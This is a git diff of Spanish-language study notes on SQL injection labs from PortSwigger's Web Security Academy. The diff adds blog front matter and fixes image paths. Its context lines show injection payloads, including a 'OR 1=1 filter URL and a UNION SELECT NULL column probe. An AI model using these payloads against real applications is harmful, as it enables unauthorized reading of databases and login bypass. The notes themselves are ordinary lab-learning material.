@@ -1,10 +1,20 @@
+---
+
+typora-copy-images-to: ../../mis_assets/img/rails/
+
+typora-root-url:  ../../
+
+layout: post
+
+---
+
 > Laboratorio 1
 
 ```html
 https://ac241f1c1e1c928a80cc0b910061008d.web-security-academy.net/filter?category=gifts'+OR+1=1-
 ```
 
-![1](DEVOPS/DEV-OPS/mis_assets/img/SQL inyection/1.png)
+![1](/DEVOPS/DEV-OPS/mis_assets/img/SQL inyection/1.png)
 
 
 
@@ -16,7 +26,7 @@ Añadimos en el campo contraseña = ‘’
 
 
 
-![2](DEV-OPS/mis_assets/img/SQL inyection/2.png)
+![2](/DEV-OPS/mis_assets/img/SQL inyection/2.png)
 
 
 
@@ -30,7 +40,7 @@ UNION SELECT NULL,NULL, NULL-
 
 
 
-![3](DEV-OPS/mis_assets/img/SQL inyection/3.png)
+![3](/DEV-OPS/mis_assets/img/SQL inyection/3.png)
 
 
 
@@ -44,4 +54,4 @@ UNION SELECT NULL,NULL, NULL-
 
 
 
-![5](DEV-OPS/mis_assets/img/SQL inyection/5.png)
+![5](/DEV-OPS/mis_assets/img/SQL inyection/5.png)
